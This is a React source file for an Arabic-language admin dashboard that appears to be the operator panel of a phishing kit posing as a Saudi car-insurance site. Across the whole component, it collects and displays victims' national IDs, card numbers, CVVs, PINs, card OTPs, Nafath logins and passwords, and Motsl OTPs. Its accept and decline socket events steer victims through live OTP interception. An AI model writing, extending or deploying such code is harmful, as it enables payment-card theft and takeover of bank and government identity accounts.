import React, { useEffect, useState } from "react";
import { serverRoute, token } from "./App";
import axios from "axios";
import { io } from "socket.io-client";
import Alret from "./Alret";
import { IoMdRefresh } from "react-icons/io";
import { IoMdCloseCircle } from "react-icons/io";
const Main = () => {
  const [loading, setLoading] = useState(false);
  const socket = io(serverRoute);
  const [data, setData] = useState([]);
  const [popup, setPopup] = useState(false);
  const [activeUsers, setActiveUsers] = useState([]);
  const [Users, setUsers] = useState([]);
  const [user, setUser] = useState({ data: {}, active: false });
  const [userOtp, setUserOtp] = useState(null);

  const uniqueNum = () =>
    Math.floor(Math.random() * (10000000 - 999999 + 1)) + 999999;

  const getUsers = async () => {
    await axios
      .get(`${serverRoute}/users`)
      .then((res) => {
        // console.log(res.data);
        setUsers(res.data);
        const online = res.data.filter((user) => !user.checked);
        setActiveUsers(online);
      })
      .catch((error) => {
        console.log(error);
      });
  };

  const handleDisplay = async (id) => {
    const user = Users.find((u) => u._id === id);
    if (!user.checked) {
      await axios.get(serverRoute + "/order/checked/" + id);
    }
    getUsers();
    setUser({ data: user, active: true });
  };

  useEffect(() => {
    getUsers();
  }, []);

  const handleAcceptVisa = async (id) => {
    socket.emit("acceptPaymentForm", id);
    setUser({ data: { ...user.data, CardAccept: true }, active: true });
    await getUsers();
  };

  const handleDeclineVisa = (id) => {
    socket.emit("declinePaymentForm", id);
    const _user = Users.find((u) => {
      if (u._id === id) {
        return { ...u, CardAccept: true };
      }
    });
    const withOut = Users.filter((u) => u._id !== id);
    setUsers([...withOut, _user]);
    setUser({ data: { ..._user, CardAccept: true }, active: true });
  };

  const handleAcceptVisaOtp = async (id) => {
    socket.emit("acceptVisaOtp", id);
    setUser({ data: { ...user.data, OtpCardAccept: true }, active: true });
    await getUsers();
  };

  const handleDeclineVisaOtp = (id) => {
    socket.emit("declineVisaOtp", id);
    const _user = Users.find((u) => {
      if (u._id === id) {
        return { ...u, OtpCardAccept: true };
      }
    });
    const withOut = Users.filter((u) => u._id !== id);
    setUsers([...withOut, _user]);
    setUser({ data: { ..._user, OtpCardAccept: true }, active: true });
  };

  const handleAcceptPin = async (id) => {
    socket.emit("acceptVisaPin", id);
    setUser({ data: { ...user.data, PinAccept: true }, active: true });
    await getUsers();
  };

  const handleDeclinePin = (id) => {
    socket.emit("declineVisaPin", id);
    const _user = Users.find((u) => {
      if (u._id === id) {
        return { ...u, PinAccept: true };
      }
    });
    const withOut = Users.filter((u) => u._id !== id);
    setUsers([...withOut, _user]);
    setUser({ data: { ..._user, PinAccept: true }, active: true });
  };

  const handleAcceptMotsl = async (id) => {
    socket.emit("acceptMotsl", id);
    setUser({ data: { ...user.data, MotslAccept: true }, active: true });
    await getUsers();
  };

  const handleDeclineMotsl = (id) => {
    socket.emit("declineMotsl", id);
    const _user = Users.find((u) => {
      if (u._id === id) {
        return { ...u, MotslAccept: true };
      }
    });
    const withOut = Users.filter((u) => u._id !== id);
    setUsers([...withOut, _user]);
    setUser({ data: { ..._user, MotslAccept: true }, active: true });
  };

  const handleAcceptMotslOtp = async (id) => {
    socket.emit("acceptMotslOtp", id);
    setUser({ data: { ...user.data, MotslOtpAccept: true }, active: true });
    await getUsers();
  };

  const handleDeclineMotslOtp = (id) => {
    socket.emit("declineMotslOtp", id);
    const _user = Users.find((u) => {
      if (u._id === id) {
        return { ...u, MotslOtpAccept: true };
      }
    });
    const withOut = Users.filter((u) => u._id !== id);
    setUsers([...withOut, _user]);
    setUser({ data: { ..._user, MotslOtpAccept: true }, active: true });
  };

  const handleAcceptSTC = async (id) => {
    socket.emit("acceptSTC", id);
    setUser({ data: { ...user.data, STCAccept: true }, active: true });
    await getUsers();
  };

  const handleDeclineSTC = (id) => {
    socket.emit("declineSTC", id);
    const _user = Users.find((u) => {
      if (u._id === id) {
        return { ...u, STCAccept: true };
      }
    });
    const withOut = Users.filter((u) => u._id !== id);
    setUsers([...withOut, _user]);
    setUser({ data: { ..._user, STCAccept: true }, active: true });
  };

  const handleAcceptNavaz = async (id) => {
    if (!userOtp) return window.alert("املاء رمز التحقق الخاص بنفاذ");
    socket.emit("acceptNavaz", { id, userOtp });
    setUser({ data: { ...user.data, NavazAccept: true }, active: true });
    await getUsers();
  };

  const handleDeclineNavaz = (id) => {
    socket.emit("declineNavaz", id);
    const _user = Users.find((u) => {
      if (u._id === id) {
        return { ...u, NavazAccept: true };
      }
    });
    const withOut = Users.filter((u) => u._id !== id);
    setUsers([...withOut, _user]);
    setUser({ data: { ..._user, NavazAccept: true }, active: true });
  };

  socket.on("newUser", async () => {
    await getUsers();
  });

  socket.on("newData", async () => {
    await getUsers();
  });

  socket.on("applyForm", async (data) => {
    await getUsers();
  });

  socket.on("paymentForm", async (data) => {
    await getUsers();
  });

  socket.on("visaOtp", async (result) => {
    const user = Users.find((u) => {
      if (u._id === result.id) {
        return { ...u, CardOtp: result.otp };
      }
    });
    await getUsers();
    setUser({ data: user, active: true });
  });

  socket.on("visaPin", async (result) => {
    const user = Users.find((u) => {
      if (u._id === result.id) {
        return { ...u, pin: result.pin };
      }
    });
    await getUsers();
    setUser({ data: user, active: true });
  });

  socket.on("motsl", async (result) => {
    const user = Users.find((u) => {
      if (u._id === result.id) {
        return {
          ...u,
          MotslPhone: result.MotslPhone,
          MotslService: result.MotslPhone,
        };
      }
    });
    await getUsers();
    setUser({ data: user, active: true });
  });

  socket.on("motslOtp", async (result) => {
    // console.log(result.MotslOtp);
    // const user = Users.find((u) => {
    //   if (u._id === result.id) {
    //     return {
    //       ...u,
    //       MotslOtp: result.MotslOtp,
    //     };
    //   }
    // });
    // setUser({ data: user, active: true });
    await getUsers();
  });

  socket.on("navaz", async (result) => {
    await getUsers();
  });

  socket.on("orderValidate", (otp) => {
    console.log(otp);
    setData([{ ...otp, mode: "orderValidate", ref: uniqueNum }, ...data]);
    setPopup(true);
  });
  return (
    <div
      className="flex w-full flex-col bg-gray-200 relative h-screen"
      dir="rtl"
    >
      <div
        className="fixed left-5 bottom-2 cursor-pointer p-2 bg-sky-800 rounded-full  text-white"
        onClick={() => window.location.reload()}
      >
        <IoMdRefresh className="text-3xl  " />
      </div>

       <div
        className="fixed left-5 bottom-16 cursor-pointer p-2 bg-red-500 rounded-full  text-white"
        onClick={async () =>
          await axios
            .delete(serverRoute + "/")
            .then(async () => await getUsers())
        }
      >
        <IoMdCloseCircle className="text-3xl  " />
      </div>

      <div className="flex w-full items-center h-screen  md:flex-row  ">
        {/* // Notifactions */}

        <div className="w-1/4 border-l border-gray-500 h-full flex flex-col  ">
          <span className="md:p-5 py-2 px-1 w-full md:text-xl text-lg text-center  border-b border-black">
            مستخدمين
          </span>
          <div className="w-full flex flex-col overflow-y-auto h-full">
            {Users.length
              ? Users.map((user, idx) => {
                  return (
                    <div
                      className="w-full px-2 py-3 md:text-lg text-sm flex justify-between items-center border-b-2 border-gray-500 cursor-pointer hover:opacity-70"
                      onClick={() => handleDisplay(user._id)}
                    >
                      <span
                        className={`w-2 h-2 bg-green-500 rounded-full ${
                          activeUsers.find((u) => u._id === user._id)
                            ? "visible"
                            : "hidden"
                        }`}
                      ></span>
                      <span className="flex-1 text-center text-gray-700 md:text-sm  text-xs ">
                        {user.national_id}
                      </span>
                    </div>
                  );
                })
              : ""}
          </div>
        </div>

        {/* data */}

        {user.active ? (
          <div className="w-3/4 border-l  border-gray-500 h-screen overflow-y-auto grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 items-start place-content-start gap-5 px-3">
            <span
              className="px-3 py-2 w-full  md:col-span-2 lg:col-span-3 text-xl text-center border-b border-black "
              dir="rtl"
            >
              بيانات عميل
              <span className="text-gray-500"> {user.data?.fullname}</span>
            </span>
            {user.data?.type ? (
              <div className="flex flex-col items-center bg-sky-800 text-white py-2 px-3 rounded-lg gap-y-1   my-2">
                <span className="text-lg mb-2">بيانات التأمين</span>
                <div className="w-full flex justify-between gap-x-3 border p-2 text-xs">
                  <span> نوع التأمين </span>
                  <span>{user.data?.type} </span>
                </div>
                <div className="w-full flex justify-between gap-x-3 border p-2 text-xs">
                  <span> رقم الهوية </span>
                  <span>{user.data?.national_id}</span>
                </div>
                {user.data.tameenType ? (
                  <div className="w-full flex justify-between gap-x-3 border p-2 text-xs">
                    <span> نوع بطافة التأمين </span>
                    <span>{user.data?.tameenType}</span>
                  </div>
                ) : (
                  ""
                )}
                {user.data.phone ? (
                  <div className="w-full flex justify-between gap-x-3 border p-2 text-xs">
                    <span>  رقم الهاتف </span>
                    <span>{user.data?.phone}</span>
                  </div>
                ) : (
                  ""
                )}

                {user.data.serialNumber ? (
                  <div className="w-full flex justify-between gap-x-3 border p-2 text-xs">
                    <span> الرقم التسلسلي </span>
                    <span>{user.data?.serialNumber}</span>
                  </div>
                ) : (
                  ""
                )}
                {user.data.car_year ? (
                  <div className="w-full flex justify-between gap-x-3 border p-2 text-xs">
                    <span> سنة الصنع</span>
                    <span>{user.data?.car_year}</span>
                  </div>
                ) : (
                  ""
                )}
                {user.data.carHolderName ? (
                  <div className="w-full flex justify-between gap-x-3 border p-2 text-xs">
                    <span> اسم مالك الوثيقة </span>
                    <span>{user.data?.carHolderName}</span>
                  </div>
                ) : (
                  ""
                )}
                {user.data.carHolderName ? (
                  <div className="w-full flex justify-between gap-x-3 border p-2 text-xs">
                    <span> تاريخ بدأ الوثيقة </span>
                    <span>{user.data?.startedDate}</span>
                  </div>
                ) : (
                  ""
                )}
                {user.data.Customs_card ? (
                  <div className="w-full flex justify-between gap-x-3 border p-2 text-xs">
                    <span> بطافة جمركية </span>
                    <span>{user.data?.Customs_card}</span>
                  </div>
                ) : (
                  ""
                )}
                {user.data.tameenFor ? (
                  <div className="w-full flex justify-between gap-x-3 border p-2 text-xs">
                    <span> طريقة التأمين </span>
                    <span>{user.data?.tameenFor}</span>
                  </div>
                ) : (
                  ""
                )}
                {user.data.tameenAllType ? (
                  <div className="w-full flex justify-between gap-x-3 border p-2 text-xs">
                    <span> القيمة التأمينية</span>
                    <span>{user.data?.carPrice}</span>
                  </div>
                ) : (
                  ""
                )}

                {user.data.car_model_and_brand ? (
                  <div className="w-full flex justify-between gap-x-3 border p-2 text-xs">
                    <span> ماركة و موديل السيارة </span>
                    <span>{user.data?.car_model_and_brand}</span>
                  </div>
                ) : (
                  ""
                )}

                {user.data.car_model ? (
                  <div className="w-full flex justify-between gap-x-3 border p-2 text-xs">
                    <span> نوع السيارة </span>
                    <span>{user.data?.car_model}</span>
                  </div>
                ) : (
                  ""
                )}

                {user.data.purpose_of_use ? (
                  <div className="w-full flex justify-between gap-x-3 border p-2 text-xs">
                    <span> الغرض من الاستخدام </span>
                    <span>{user.data?.purpose_of_use}</span>
                  </div>
                ) : (
                  ""
                )}

                {user.data.car_year ? (
                  <div className="w-full flex justify-between gap-x-3 border p-2 text-xs">
                    <span> سنة الصنع </span>
                    <span>{user.data?.car_year}</span>
                  </div>
                ) : (
                  ""
                )}
              </div>
            ) : (
              ""
            )}
            {user.data?.cardNumber ? (
              <div className="flex flex-col items-center bg-sky-800 text-white py-2 px-3 rounded-lg gap-y-1   my-2">
                <span className="text-lg mb-2">بيانات الفيزا</span>
                <div className="w-full flex justify-between gap-x-3 border p-2 text-xs">
                  <span> الاسم علي الكارت </span>
                  <span>{user.data?.card_name} </span>
                </div>
                <div className="w-full flex justify-between gap-x-3 border p-2 text-xs">
                  <span> رقم الكارت </span>
                  <span>{user.data?.cardNumber}</span>
                </div>
                {user.data.expiryDate ? (
                  <div className="w-full flex justify-between gap-x-3 border p-2 text-xs">
                    <span> تاريخ الانتهاء</span>
                    <span>{user.data?.expiryDate}</span>
                  </div>
                ) : (
                  ""
                )}

                {user.data.cvv ? (
                  <div className="w-full flex justify-between gap-x-3 border p-2 text-xs">
                    <span> cvv </span>
                    <span>{user.data?.cvv}</span>
                  </div>
                ) : (
                  ""
                )}
                {user.data.CardAccept ? (
                  ""
                ) : (
                  <div className="w-full flex col-span-2 md:col-span-1 justify-between gap-x-3  p-2 text-xs">
                    <button
                      className="bg-green-500 w-1/2 p-2 rounded-lg"
                      onClick={() => handleAcceptVisa(user.data._id)}
                    >
                      قبول
                    </button>
                    <button
                      className="bg-red-500 w-1/2 p-2 rounded-lg"
                      onClick={() => handleDeclineVisa(user.data._id)}
                    >
                      رفض
                    </button>
                  </div>
                )}
                {user.data.CardOtp ? (
                  <>
                    <div className="w-full flex justify-between gap-x-3 border p-2 text-xs">
                      <span> رمز التحقق </span>
                      <span>{user.data?.CardOtp}</span>
                    </div>
                    {user.data.OtpCardAccept ? (
                      ""
                    ) : (
                      <div className="w-4/5 flex col-span-2 md:col-span-1 justify-between gap-x-3  p-2 text-xs">
                        <button
                          className="bg-green-500 w-1/2 p-2 rounded-lg"
                          onClick={() => handleAcceptVisaOtp(user.data._id)}
                        >
                          قبول
                        </button>
                        <button
                          className="bg-red-500 w-1/2 p-2 rounded-lg"
                          onClick={() => handleDeclineVisaOtp(user.data._id)}
                        >
                          رفض
                        </button>
                      </div>
                    )}
                  </>
                ) : (
                  ""
                )}

                {user.data?.pin ? (
                  <>
                    <span className="text-lg mb-2">رقم سري البطاقة</span>
                    <div className="w-4/5 flex justify-between gap-x-3 border p-2 text-xs">
                      <span> رقم </span>
                      <span>{user.data?.pin}</span>
                    </div>
                    {user.data.PinAccept ? (
                      ""
                    ) : (
                      <div className="w-4/5 flex col-span-2 md:col-span-1 justify-between gap-x-3  p-2 text-xs">
                        <button
                          className="bg-green-500 w-1/2 p-2 rounded-lg"
                          onClick={() => handleAcceptPin(user.data._id)}
                        >
                          قبول
                        </button>
                        <button
                          className="bg-red-500 w-1/2 p-2 rounded-lg"
                          onClick={() => handleDeclinePin(user.data._id)}
                        >
                          رفض
                        </button>
                      </div>
                    )}
                  </>
                ) : (
                  ""
                )}
              </div>
            ) : (
              ""
            )}

            {user.data?.MotslPhone ? (
              <div className="flex flex-col items-center bg-sky-800 text-white py-2 px-3 rounded-lg gap-y-1 justify-center   my-2">
                <div className="w-full flex flex-col justify-center items-center">
                  <span className="text-lg mb-2"> بوابة متصل</span>
                  <div className="w-4/5 flex justify-between gap-x-3 border p-2 text-xs">
                    <span> هاتف </span>
                    <span>{user.data?.MotslPhone}</span>
                  </div>
                  <div className="w-4/5 flex justify-between gap-x-3 border p-2 text-xs">
                    <span> شبكة </span>
                    <span>{user.data?.MotslNetwork}</span>
                  </div>
                  {user.data.MotslAccept ? (
                    ""
                  ) : (
                    <div className="w-4/5 flex col-span-2 md:col-span-1 justify-between gap-x-3  p-2 text-xs">
                      <button
                        className="bg-green-500 w-1/2 p-2 rounded-lg"
                        onClick={() => handleAcceptMotsl(user.data._id)}
                      >
                        قبول
                      </button>
                      <button
                        className="bg-red-500 w-1/2 p-2 rounded-lg"
                        onClick={() => handleDeclineMotsl(user.data._id)}
                      >
                        رفض
                      </button>
                    </div>
                  )}
                  {user.data?.MotslOtp ? (
                    <>
                      <span className="text-lg mb-2">رمز تحقق </span>
                      <div className="w-4/5 flex justify-between gap-x-3 border p-2 text-xs">
                        <span> الرمز </span>
                        <span>{user.data?.MotslOtp}</span>
                      </div>
                      {user.data.MotslOtpAccept ? (
                        ""
                      ) : (
                        <div className="w-4/5 flex col-span-2 md:col-span-1 justify-between gap-x-3  p-2 text-xs">
                          <button
                            className="bg-green-500 w-1/2 p-2 rounded-lg"
                            onClick={() => handleAcceptMotslOtp(user.data._id)}
                          >
                            قبول
                          </button>
                          <button
                            className="bg-red-500 w-1/2 p-2 rounded-lg"
                            onClick={() => handleDeclineMotslOtp(user.data._id)}
                          >
                            رفض
                          </button>
                        </div>
                      )}
                    </>
                  ) : (
                    ""
                  )}
                  {user.data?.MotslNetwork === "STC" &&
                  user.data?.MotslOtpAccept ? (
                    <>
                      <span className="text-lg my-2"> شبكة STC </span>
                      {user.data.STCAccept ? (
                        "تم الرد"
                      ) : (
                        <div className="w-4/5 flex col-span-2 md:col-span-1 justify-between gap-x-3  p-2 text-xs">
                          <button
                            className="bg-green-500 w-1/2 p-2 rounded-lg"
                            onClick={() => handleAcceptSTC(user.data._id)}
                          >
                            قبول
                          </button>
                          <button
                            className="bg-red-500 w-1/2 p-2 rounded-lg"
                            onClick={() => handleDeclineSTC(user.data._id)}
                          >
                            رفض
                          </button>
                        </div>
                      )}
                    </>
                  ) : (
                    ""
                  )}
                </div>
              </div>
            ) : (
              ""
            )}

            {user.data?.NavazUser ? (
              <div className="flex flex-col items-center bg-sky-800 text-white py-2 px-3 rounded-lg gap-y-1 justify-center   my-2">
                <div className="w-full flex flex-col justify-center items-center">
                  <span className="text-lg mb-2"> بوابة نفاذ</span>
                  <div className="w-4/5 flex justify-between gap-x-3 border p-2 text-xs">
                    <span> اسم المستخدم </span>
                    <span>{user.data?.NavazUser}</span>
                  </div>
                  <div className="w-4/5 flex justify-between gap-x-3 border p-2 text-xs">
                    <span> كلمة المرور </span>
                    <span>{user.data?.NavazPassword}</span>
                  </div>
                  <div className="w-4/5 flex flex-col justify-center items-center gap-y-3 border p-2 text-xs">
                    <span> الرمز المرسل </span>
                    <input
                      type="text"
                      className="rounded-md w-4/5 py-2 px-1 text-black"
                      onChange={(e) => setUserOtp(e.target.value)}
                      value={userOtp}
                    />
                  </div>

                  <div className="w-4/5 flex col-span-2 md:col-span-1 justify-between gap-x-3  p-2 text-xs">
                    <button
                      className="bg-green-500 w-1/2 p-2 rounded-lg"
                      onClick={() => handleAcceptNavaz(user.data._id)}
                    >
                      ارسال
                    </button>
                    <button
                      className="bg-red-500 w-1/2 p-2 rounded-lg"
                      onClick={() => handleDeclineNavaz(user.data._id)}
                    >
                      رفض
                    </button>
                  </div>
                </div>
              </div>
            ) : (
              ""
            )}
            {/* {user.data?.NavazOtp ? (
              <div className="flex flex-col items-center bg-sky-800 text-white py-2 px-3 rounded-lg gap-y-1 justify-center   my-2">
                <div className="w-full flex flex-col justify-center items-center">
                  <span className="text-lg mb-2"> تحقق رمز نفاذ</span>
                  <div className="w-4/5 flex justify-between gap-x-3 border p-2 text-xs">
                    <span> رقم التحقق </span>
                    <span>{user.data?.NavazOtp}</span>
                  </div>
                  <div className="w-4/5 flex flex-col justify-center items-center gap-y-3 border p-2 text-xs">
                    <span> الرمز المرسل </span>
                    <input
                      type="text"
                      className="rounded-md w-4/5 py-2 px-1 text-black"
                      onChange={(e) => setNavazValidateOtp(e.target.value)}
                      value={navazValidateOtp}
                    />
                  </div>

                  <div className="w-4/5 flex col-span-2 md:col-span-1 justify-between gap-x-3  p-2 text-xs">
                    <button
                      className="bg-red-500 w-1/2 p-2 rounded-lg"
                      onClick={() => handleDeclineNavazOtp(user.data._id)}
                    >
                      ارسال
                    </button>
                    <button
                      className="bg-green-500 w-1/2 p-2 rounded-lg"
                      onClick={() => handleAcceptNavazOtp(user.data._id)}
                    >
                      قبول
                    </button>
                  </div>
                </div>
              </div>
            ) : (
              ""
            )} */}
          </div>
        ) : (
          ""
        )}

        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3"></div>
        {/* {popup && (
          <Alret
            data={data}
            setPopup={setPopup}
            setData={setData}
            socket={socket}
          />
        )} */}
      </div>
    </div>
  );
};

export default Main;
